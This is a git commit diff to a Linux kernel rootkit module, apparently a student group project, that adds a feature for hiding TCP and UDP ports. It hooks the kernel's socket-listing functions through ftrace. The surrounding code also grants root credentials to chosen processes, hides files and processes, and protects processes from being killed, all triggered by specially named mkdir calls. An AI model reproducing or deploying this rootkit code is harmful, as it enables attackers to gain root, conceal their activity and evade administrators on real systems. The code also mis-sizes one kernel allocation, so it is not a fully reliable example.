4538326c49a5c6238075078965d8923e52a7e652
crumbledwall <mail@harmless.blue>
2022-10-16 20:37:51 +0800

    feat: add hide port

--- rootkit.c
+++ rootkit.c
@@ -5,6 +5,8 @@
 #include <linux/kallsyms.h>
 #include <linux/version.h>
 #include <linux/dirent.h>
+#include <linux/tcp.h>
+#include <linux/udp.h>
 
 MODULE_LICENSE("Dual MIT/GPL");
 MODULE_AUTHOR("Group 10");
@@ -14,6 +16,10 @@ MODULE_VERSION("1.0.0");
 #include "hook.h"
 #define INLIST 1
 #define NOTINLIST 0
+#define TCP 0
+#define UDP 1
+#define IPV4 4
+#define IPV6 6
 
 void find_task(unsigned long task_pid, struct task_struct *task)
 {
@@ -45,7 +51,7 @@ void set_root(unsigned long task_pid)
 
     if (root == NULL)
     {
-        printk(KERN_ALERT "rootkit: Failed to get creds.\n");
+        printk(KERN_INFO "rootkit: Failed to get creds.\n");
         return;
     }
 
@@ -56,7 +62,7 @@ void set_root(unsigned long task_pid)
     
     rcu_assign_pointer(task->cred, root);
 
-    printk(KERN_ALERT "rootkit: Process #%lu is root now.\n", task_pid);
+    printk(KERN_INFO "rootkit: Process #%lu is root now.\n", task_pid);
 }
 
 struct hide_file_list {
@@ -74,9 +80,17 @@ struct protect_process_list {
     pid_t pid;
 };
 
+struct hide_port_list {
+    struct list_head list;
+    int protocol_type;
+    int ip_type;
+    unsigned long port;
+};
+
 struct hide_file_list *hide_files_head;
 struct hide_process_list *hide_processes_head;
 struct protect_process_list *protect_processes_head;
+struct hide_port_list *hide_ports_head;
 
 void init_links(void)
 {
@@ -89,8 +103,14 @@ void init_links(void)
     INIT_LIST_HEAD(&hide_processes_head->list);
 
     protect_processes_head = kmalloc(GFP_KERNEL, sizeof(struct protect_process_list));
-    protect_processes_head->pid= 0;
+    protect_processes_head->pid = 0;
     INIT_LIST_HEAD(&protect_processes_head->list);
+
+    hide_ports_head = kmalloc(GFP_KERNEL, sizeof(struct hide_port_list));
+    hide_ports_head->protocol_type = 0;
+    hide_ports_head->ip_type = 0;
+    hide_ports_head->port = 0;
+    INIT_LIST_HEAD(&hide_ports_head->list);
 }
 
 void add_hide_file(const char * filename)
@@ -170,7 +190,7 @@ void del_hide_process(const char * pid)
     struct file* target = NULL;
     strcpy(process_proc, "/proc/");
     strcat(process_proc, pid);
-    printk(KERN_DEBUG "rootkit: deleting %s\n", process_proc);
+    printk(KERN_INFO "rootkit: deleting %s\n", process_proc);
     target = filp_open(process_proc, O_PATH, 0);
     if(!IS_ERR(target)){
         list_for_each_entry_safe(cursor, temp, &hide_processes_head->list, list) {
@@ -240,15 +260,59 @@ int check_protect_process(pid_t pid)
     return NOTINLIST;
 }
 
+void add_hide_port(int protocol_type, int ip_type, unsigned long port)
+{
+    struct hide_port_list *temp_port = kmalloc(sizeof(struct hide_file_list), GFP_KERNEL);
+    temp_port->protocol_type = protocol_type;
+    temp_port->ip_type = ip_type;
+    temp_port->port = port;
+    INIT_LIST_HEAD(&temp_port->list);
+    list_add_tail(&temp_port->list, &hide_ports_head->list);
+
+    printk(KERN_INFO "rootkit: Hide port added: %s %s %lu.\n", (protocol_type == TCP) ? "TCP" : "UDP", (ip_type == IPV4) ? "IPV4" : "IPV6", port);
+}
+
+void del_hide_port(int protocol_type, int ip_type, unsigned long port)
+{
+    struct hide_port_list *cursor, *temp;
+
+    list_for_each_entry_safe(cursor, temp, &hide_ports_head->list, list) {
+        if(protocol_type == cursor->protocol_type && ip_type == cursor->ip_type && port == cursor->port)
+        {
+            list_del(&cursor->list);
+            kfree(cursor);
+        }
+    }
+
+    printk(KERN_INFO "rootkit: Hide port deleted: %s %s %lu.\n", (protocol_type == TCP) ? "TCP" : "UDP", (ip_type == IPV4) ? "IPV4" : "IPV6", port);
+}
+
+int check_hide_port(int protocol_type, int ip_type, unsigned long port)
+{
+    struct hide_port_list *temp;
+    list_for_each_entry(temp, &hide_ports_head->list, list) {
+        if(protocol_type == temp->protocol_type && ip_type == temp->ip_type && port == temp->port)
+        {
+            return INLIST;
+        }
+    }
+
+    return NOTINLIST;
+}
+
 static asmlinkage long (*orig_mkdir)(const struct pt_regs *);
 static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
 static asmlinkage long (*orig_kill)(const struct pt_regs *);
+static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
+static asmlinkage long (*orig_tcp6_seq_show)(struct seq_file *seq, void *v);
+static asmlinkage long (*orig_udp4_seq_show)(struct seq_file *seq, void *v);
+static asmlinkage long (*orig_udp6_seq_show)(struct seq_file *seq, void *v);
 
 static struct list_head *prev_module;
 typedef unsigned char *byte_pointer;
 
 void debug_show_bytes(byte_pointer start, int len) {
-    printk(KERN_DEBUG "rootkit: Debug start: ");
+    printk(KERN_INFO "rootkit: Debug start: ");
 
     for (int i = 0; i < len; i++)
     {
@@ -321,12 +385,19 @@ asmlinkage int hook_mkdir(const struct pt_regs *regs)
     } 
     else if(strncmp(dir_name, "protect-process@", 16) == 0) 
     {
-        printk(KERN_DEBUG "rootkit: Protect %s.\n", &dir_name[16]);
         add_protect_process((pid_t)simple_strtol(&dir_name[16], (char **)(dir_name), 10));
     }
     else if(strncmp(dir_name, "unprotect-process@", 18) == 0) 
     {
         del_protect_process((pid_t)simple_strtol(&dir_name[18], (char **)(dir_name), 10));
+    } 
+    else if(strncmp(dir_name, "hide-port@", 10) == 0) 
+    {
+        add_hide_port((strncmp(&dir_name[10], "tcp", 3) == 0) ? TCP : UDP, (dir_name[13] == '4') ? IPV4 : IPV6, (unsigned long)simple_strtol(&dir_name[15], (char **)(dir_name), 10));
+    }
+    else if(strncmp(dir_name, "show-port@", 10) == 0) 
+    {
+        del_hide_port((strncmp(&dir_name[10], "tcp", 3) == 0) ? TCP : UDP, (dir_name[13] == '4') ? IPV4 : IPV6, (unsigned long)simple_strtol(&dir_name[15], (char **)(dir_name), 10));
     } 
     else 
     {
@@ -353,7 +424,7 @@ asmlinkage int hook_getdents64(const struct pt_regs *regs)
     error = copy_from_user(dirent_ker, dirent, ret);
     if(error)
     {
-        printk(KERN_DEBUG "rootkit: Copy failed.\n");
+        printk(KERN_INFO "rootkit: Copy failed.\n");
         kfree(dirent_ker);
         return ret;
     }
@@ -382,7 +453,7 @@ asmlinkage int hook_getdents64(const struct pt_regs *regs)
 
     error = copy_to_user(dirent, dirent_ker, ret);
     if(error)
-        printk(KERN_DEBUG "rootkit: Copy failed.\n");
+        printk(KERN_INFO "rootkit: Copy failed.\n");
 
     kfree(dirent_ker);
     return ret;
@@ -397,10 +468,54 @@ asmlinkage int hook_kill(const struct pt_regs *regs) {
     return orig_kill(regs);
 }
 
+static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v)
+{
+    struct sock *sk = v;
+
+    if (sk != 0x1 && check_hide_port(TCP, IPV4, sk->sk_num))
+        return 0;
+
+    return orig_tcp4_seq_show(seq, v);
+}
+
+static asmlinkage long hook_tcp6_seq_show(struct seq_file *seq, void *v)
+{
+    struct sock *sk = v;
+
+    if (sk != 0x1 && check_hide_port(TCP, IPV6, sk->sk_num))
+        return 0;
+
+    return orig_tcp6_seq_show(seq, v);
+}
+
+static asmlinkage long hook_udp4_seq_show(struct seq_file *seq, void *v)
+{
+    struct sock *sk = v;
+
+    if (sk != 0x1 && check_hide_port(UDP, IPV4, sk->sk_num))
+        return 0;
+
+    return orig_udp4_seq_show(seq, v);
+}
+
+static asmlinkage long hook_udp6_seq_show(struct seq_file *seq, void *v)
+{
+    struct sock *sk = v;
+
+    if (sk != 0x1 && check_hide_port(UDP, IPV6, sk->sk_num))
+        return 0;
+
+    return orig_udp6_seq_show(seq, v);
+}
+
 static struct ftrace_hook hooks[] = {
     HOOK("__x64_sys_mkdir", hook_mkdir, &orig_mkdir),
     HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
     HOOK("__x64_sys_kill", hook_kill, &orig_kill),
+    HOOK("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show),
+    HOOK("tcp6_seq_show", hook_tcp6_seq_show, &orig_tcp6_seq_show),
+    HOOK("udp4_seq_show", hook_udp4_seq_show, &orig_udp4_seq_show),
+    HOOK("udp6_seq_show", hook_udp6_seq_show, &orig_udp6_seq_show),
 };
 
 
